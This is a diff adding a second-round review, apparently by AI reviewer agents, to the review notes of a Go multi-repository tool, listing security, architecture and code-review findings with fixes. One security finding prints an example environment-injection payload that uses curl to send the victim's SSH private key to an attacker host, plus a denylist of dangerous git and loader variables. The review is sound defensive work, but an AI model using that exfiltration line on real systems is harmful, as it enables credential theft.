@@ -2,6 +2,278 @@
 
 Reviewed: 2026-04-09 (initial), updated 2026-04-09 (deep review), bulk fixes 2026-04-10
 
+---
+
+## Round 2 — SE Team Review (2026-04-12, PR #4 `arch-rev`)
+
+Three specialist agents reviewed the full codebase + PR #4 diff:
+- **Security Reviewer** — subprocess/env injection, path traversal, SSRF, URL validation, credential handling
+- **Architecture Reviewer** — design quality, package boundaries, concurrency, config loading paths, testability
+- **Code Reviewer** — PR #4 diff analysis + all 9 Copilot inline comment verdicts
+
+### Round 2 Summary
+
+| Severity | Count | Source |
+|----------|-------|--------|
+| CRITICAL | 6 | 3 security + 3 architecture |
+| HIGH | 8 | 3 security + 5 architecture + 2 code-review additional |
+| MEDIUM | 13 | 5 security + 7 architecture + 1 code-review additional |
+| LOW | 3 | code-review |
+
+---
+
+### Security — CRITICAL
+
+#### SEC-C1 — Environment Variable Injection → RCE / Credential Exfiltration
+
+**Status:** Open
+**File:** `internal/repository/manager.go:272-280`
+
+`buildEnvironment` merges the entire `Repository.Environment` map verbatim into the subprocess environment for every `git` invocation with zero validation. An attacker who controls a remote include can set `GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, or `GIT_EXEC_PATH` to execute arbitrary code when any git operation runs.
+
+**Exploitation:** Remote include defines `environment: { GIT_SSH_COMMAND: "curl -d @~/.ssh/id_rsa https://attacker.com" }` — victim's private key is exfiltrated on `gorepos clone`.
+
+**Fix:** Add a denylist of dangerous git/system env keys (`GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, `GIT_EXEC_PATH`, `GIT_ASKPASS`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PATH`) checked in both `buildEnvironment` and `ValidateConfig`. Log and reject blocked keys.
+
+---
+
+#### SEC-C2 — Path Traversal via `repo.Path`
+
+**Status:** Open
+**File:** `internal/config/validation.go:96-98`, `internal/repository/manager.go:259-268`
+
+`filepath.Join(basePath, repo.Path)` does not prevent `../../` traversal. `getRepoPath` also returns absolute paths (`filepath.IsAbs(repo.Path)`) with no restriction whatsoever. A remote include can clone into `~/.ssh`, `/etc`, or anywhere on the filesystem.
+
+**Fix:** After `filepath.Join`, verify the resolved path has `basePath` as a prefix. Reject absolute paths from remote includes or constrain them to a permitted root.
+
+---
+
+#### SEC-C3 — No URL Scheme Allowlist for Repository URLs
+
+**Status:** Open
+**File:** `internal/config/validation.go:91-93`
+
+URL validation only calls `url.Parse()`, which accepts `file://`, `git://`, and HTTP URLs targeting RFC-1918 / link-local addresses. All reach `git clone` unfiltered.
+
+**Fix:** Allowlist only `https://` and `ssh://` (and SCP-syntax `git@…`). Block `http://`, `file://`, `git://`, and any host resolving to a private/reserved IP range.
+
+---
+
+### Security — HIGH
+
+#### SEC-H1 — Option Injection via `user`/`email` in `git config`
+
+**Status:** Open
+**File:** `internal/repository/manager.go:64-69`, `internal/config/validation.go`
+
+`user`/`email` from config are passed as positional args to `git config user.name <value>`. Values starting with `--` are parsed as flags by git (e.g., `--file=/path`, `--unset`, `--remove-section`). `validateUserName`/`validateEmail` exist in `setup.go` but are never called from `ValidateConfig`. Identity spoofing: a remote include can stamp attacker-chosen name/email on commits.
+
+**Fix:** Validate `user`/`email` in `ValidateConfig` and `validatePartialConfig`. Reject values starting with `-`. Propagate errors from `git config` calls instead of discarding with `_`.
+
+---
+
+#### SEC-H2 — SSRF via HTTP Remote Includes (Redirect Following)
+
+**Status:** Open
+**File:** `internal/config/loader.go:298-333`
+
+`LoadRemoteConfig` uses `http.Client` with default redirect-following. A trusted config URL can redirect to `http://169.254.169.254/…` (AWS IMDSv1) or internal services.
+
+**Fix:** Set `CheckRedirect: func(...) error { return http.ErrUseLastResponse }`. Block RFC-1918 / link-local IP ranges before fetching.
+
+---
+
+#### SEC-H3 — Identity Validation Structural Gap
+
+**Status:** Open
+**File:** `internal/config/validation.go` (missing calls)
+
+`validateUserName`/`validateEmail` are never called from the config loading path. All four code paths — `repositories[].user/email`, `global.credentials.git*`, `includes[].user/email`, `ApplyIncludeIdentity()` — skip content validation.
+
+**Fix:** Wire validators into `ValidateConfig` and `validatePartialConfig` for every identity field.
+
+---
+
+### Architecture — CRITICAL
+
+#### C-1 — Validate-before-defaults in `LoadConfigWithDetails`
+
+**Status:** Open (confirmed by code-review agent as HIGH/confirmed bug)
+**File:** `internal/config/loader.go:56-83`
+
+`LoadConfigWithDetails` calls `ValidateConfig` before `setDefaults`. `ValidateConfig` requires `Workers >= 1` and `Timeout >= 1s`, but `setDefaults` is what sets those values. Any config omitting `workers`/`timeout` (the common case) fails validation for `status`, `repos`, `validate`, `groups` commands while `clone`/`update` work fine — split-brain failure mode.
+
+**Fix:** In `LoadConfigWithDetails`, swap call order: `setDefaults` → `applyRootGroupInheritance` → `ValidateConfig`.
+
+---
+
+#### C-2 — Cycle Detection Uses Unstable `include.String()` Key
+
+**Status:** Open (confirmed by code-review agent as MEDIUM)
+**File:** `pkg/graph/builder.go:145, 189`
+
+`include.String()` appends identity fields to the key. Two configs forming a cycle with different `user=` values produce different keys — the cycle is missed, causing stack overflow or infinite remote-clone loop.
+
+**Fix:** Use `include.Repo + "@" + include.Ref + ":" + include.GetFile()` as the cycle-detection key (matching the flat loader's approach in `loader.go:256-260`).
+
+---
+
+#### C-3 — Executor Silently Drops Results on Context Cancellation
+
+**Status:** Open
+**File:** `internal/executor/pool.go:83-88`
+
+`case <-ctx.Done(): return` in the worker discards the computed result without sending it. Cancelled runs return `nil` error instead of partial error accumulation — silent partial failures on SIGINT or timeout.
+
+**Fix:** Remove the `ctx.Done()` branch from the send select. The channel is sized to `len(operations)`, so the send never blocks under normal use.
+
+---
+
+### Architecture — HIGH
+
+#### H-1 — Two Loading Paths with Different Repo Precedence Semantics
+
+**Status:** Open
+**File:** `cmd/gorepos/main.go` vs `internal/commands/helpers.go`
+
+`clone`/`update` use the graph path (last-write-wins). `status`/`repos`/`validate`/`groups` use the flat path (first-write-wins). The same config can produce different effective repository URLs/paths depending on which command runs — silent correctness divergence.
+
+**Fix:** Consolidate on one path. The graph path is architecturally richer; adapt `LoadConfigWithDetails` to derive its result from `BuildGraph`.
+
+---
+
+#### H-2 — `git reset --hard` Destroys Unpushed Local Commits
+
+**Status:** Open
+**File:** `internal/repository/manager.go:117-133`
+
+`Update` checks `IsClean` (no uncommitted changes) but not `AheadBehind.Ahead > 0` (unpushed commits). A user with local commits that are clean-but-unpushed loses all work silently.
+
+**Fix:** Replace `reset --hard` with `git pull --ff-only`, or add an explicit `AheadBehind.Ahead > 0` guard before resetting.
+
+---
+
+#### H-3 — `Operation.Context` is a Dead API
+
+**Status:** Open
+**File:** `pkg/types/types.go:174`, `internal/executor/pool.go:71`
+
+All callers set `Context: ctx` on `Operation`, but the executor reads its own `execCtx` from `Execute()` and never reads `op.Context`. Per-operation timeouts are impossible; callers populate a meaningless field.
+
+**Fix:** Either remove the field and document pool-wide cancellation, or honour it: use `op.Context` (with fallback to `execCtx`) per operation.
+
+---
+
+#### H-4 — `CredentialConfig` Dead Fields (SSHKeyPath / GitCredHelper / TokenEnvVar)
+
+**Status:** Open
+**File:** `pkg/types/types.go:161-167`, `internal/repository/manager.go:272-281`
+
+Three credential fields are accepted by the schema and stored in config but never read during git operations. Users who configure SSH key auth believe it is applied; it is not. `buildEnvironment` only passes `repo.Environment` through.
+
+**Fix:** Implement the fields (inject `GIT_SSH_COMMAND` for `SSHKeyPath`; set credential helper; expand `TokenEnvVar`) or remove them and document reliance on ambient git credential manager.
+
+---
+
+#### H-5 — `extractHierarchyPath` Hardcodes `"configs"` Sentinel
+
+**Status:** Open
+**File:** `pkg/graph/builder.go:264-298`
+
+The hierarchy path extraction only works if config files live inside a directory named `"configs"`. Everything else silently returns empty path, breaking group inheritance and `IsInScope` logic.
+
+**Fix:** Remove the hardcoded sentinel. Derive the hierarchy from the include relationship (parent→child path) or make the base directory name configurable.
+
+---
+
+#### H-6 — `GraphQuery` Interface Violates Interface Segregation (25 methods, includes mutations)
+
+**Status:** Open
+**File:** `pkg/graph/types.go:142-188`
+
+Any test needing a fake `GraphQuery` must implement all 25 methods including mutation methods (`AddNode`, `RemoveNode`, etc.). Commands that accept `GraphQuery` cannot be unit-tested without building a real graph.
+
+**Fix:** Split into `GraphReader` (query/display methods) and `GraphMutator` (add/remove/build). Commands should accept `GraphReader`.
+
+---
+
+### Architecture — MEDIUM (Selected)
+
+#### M-1 — `GetMergedConfig` Non-Deterministic with Multiple Includes
+
+**File:** `pkg/graph/builder.go:779` — map iteration order randomised; different Level-1 nodes may be selected each run.
+
+#### M-2 — `resolveAzureDevOps` Always Uses `versionType=branch`
+
+**File:** `internal/config/platform.go:144-147` — tag/commit refs return HTTP 400 from ADO Items API.
+
+#### M-3 — `looksLikeCommitHash` Matches Short Hex Branch Names (7-char)
+
+**File:** `internal/config/loader.go:410-420` — `cafebabe`, `deadbeef` etc. trigger wrong clone strategy.
+
+#### M-4 — No Remote Config Caching
+
+**File:** `internal/config/loader.go:340-407` — same repo cloned once per include reference; N×clone latency.
+
+#### M-5 — `ReposCommand` Duplicates Git Execution Logic from `repository.Manager`
+
+**File:** `internal/commands/repos.go:259-344` — two separate porcelain output parsers that must be kept in sync.
+
+#### M-6 — `GetContextRepositoryNames` Is Dead Code with Wrong Filtering Logic
+
+**File:** `internal/commands/helpers.go:83-122` — exported, never called, bidirectional prefix check differs from `FilterRepositoriesByContext`.
+
+#### M-7 — `filterRepositoriesByContext` Wrapper in `main.go` Is a One-Line Pass-Through
+
+**File:** `cmd/gorepos/main.go:179-181` — remove and call `commands.FilterRepositoriesByContext` directly.
+
+---
+
+### Code Review — PR #4 Copilot Comment Verdicts
+
+| # | File | Verdict | Severity |
+|---|------|---------|----------|
+| 1 | `scripts/build.sh:353` | **REAL BUG** — linker silently ignores unknown symbol; version never injected | LOW |
+| 2 | `scripts/build.sh:366` | **REAL BUG** — debug echo to stdout breaks piped consumers | LOW |
+| 3 | `internal/config/platform.go:110` | **REAL BUG** — GHES hosts get `raw.githubusercontent.com` URL → 404 | HIGH |
+| 4 | `pkg/types/types.go:49` | **NOT PRACTICAL** — yaml.v3 allocates fresh struct per slice element; not exploitable | LOW/INFO |
+| 5 | `internal/config/validation.go:99` | **REAL BUG** — compounded by SEC-H1 above | MEDIUM |
+| 6 | `internal/config/validation.go:41` | **REAL BUG** — same as C-1; validate before defaults on flat path | HIGH |
+| 7 | `pkg/graph/builder.go:191` | **REAL BUG** — same as C-2; cycle evasion via identity-in-key | MEDIUM |
+| 8 | `internal/repository/manager.go:69` | **REAL BUG** — errors discarded, identity silently not applied | MEDIUM |
+| 9 | `pkg/types/types.go:158` | **DOCS MISMATCH** — Gitea/Forgejo in comment, not in type allowlist | LOW |
+
+### Code Review — Additional Issues (PR #4)
+
+#### CR-H1 — `resolveGitHub` Hardcodes `raw.githubusercontent.com`
+
+**File:** `internal/config/platform.go:110` — ignores `u.Hostname()` entirely. GHES users get 404. **Fix:** Use `u.Hostname()` in the format string (as `resolveGitLab` and `resolveBitbucket` already do).
+
+#### CR-H2 — `resolveAzureDevOps` Always `versionType=branch`
+
+**File:** `internal/config/platform.go:143` — duplicate of M-2 above; tag/commit refs return HTTP 400.
+
+#### CR-M1 — `LoadRemoteConfigViaGit` Has No Context / Timeout
+
+**File:** `internal/config/loader.go:340` — all `exec.Command` calls inside (clone, fetch, checkout) are context-free. Hangs indefinitely on unreachable remote. **Fix:** Add `ctx context.Context` parameter and use `exec.CommandContext`.
+
+---
+
+### Architecture — Strengths (PR #4)
+
+- **`RepositoryManager` interface** — clean, minimal, testable seam for the executor
+- **Local cycle detection** uses symlink-resolved absolute paths (handles macOS `/var` → `/private/var`)
+- **`IncludeEntry.UnmarshalYAML`** — transparent handling of string vs structured include; excellent UX
+- **SHA-256 node IDs** for config nodes — deterministic, content-addressable
+- **`ApplyIncludeIdentity` precedence** — repo > include > global; correct override hierarchy
+- **`PersistentPreRunE` git binary check** — fails fast with clear message before command execution
+- **Buffered channel sized to `len(operations)`** — prevents goroutine leaks in normal path
+- **Sparse clone with `--filter=blob:none`** — correct trade-off for config-file fetches
+- **`resolveByType` dispatch** with caller-supplied custom platforms before built-in switch — clean extensibility
+
+---
+
+
 ## Test Results (after fixes)
 
 ```
